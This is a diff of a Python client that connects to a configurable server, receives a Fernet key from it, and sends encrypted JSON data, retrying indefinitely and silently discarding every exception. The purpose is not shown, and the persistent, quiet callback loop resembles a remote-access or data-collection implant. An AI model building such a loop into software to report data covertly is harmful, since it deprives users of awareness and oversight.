@@ -51,47 +51,33 @@ SERVER_HOST = get_server_host()
 key = None
 fernet = None
 
-def get_key():
-    global key, fernet
-    while True:
-        try:
-            # Temporary socket to fetch the key
-            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-                s.connect((SERVER_HOST, SERVER_PORT))
-                s.send(b'get_key')
-                key = s.recv(1024)
-                fernet = Fernet(key)
-                break
-        except Exception as e:
-            time.sleep(5)
-
-get_key() # Initial key fetch
-
-# --- Connection ---
-client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+client_socket = None
+fernet = None
 
 def connect_to_server():
+    global client_socket, fernet
     while True:
         try:
+            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             client_socket.connect((SERVER_HOST, SERVER_PORT))
+            key = client_socket.recv(1024)
+            fernet = Fernet(key)
             break
-        except ConnectionRefusedError:
-            time.sleep(5)
         except Exception as e:
             time.sleep(5)
 
-connect_to_server() # Initial connection attempt
+connect_to_server()
 
 def send_data(data):
-    global fernet
-    if not fernet:
-        get_key() # Refetch key if not available
+    global fernet, client_socket
+    if not fernet or not client_socket:
+        connect_to_server() # Reconnect if not connected
         return
 
     try:
         encrypted_data = fernet.encrypt(json.dumps(data).encode('utf-8'))
         client_socket.sendall(encrypted_data + b'\n')
-    except (ConnectionResetError, BrokenPipeError):
+    except (ConnectionResetError, BrokenPipeError, OSError):
         connect_to_server()
     except Exception as e:
         pass
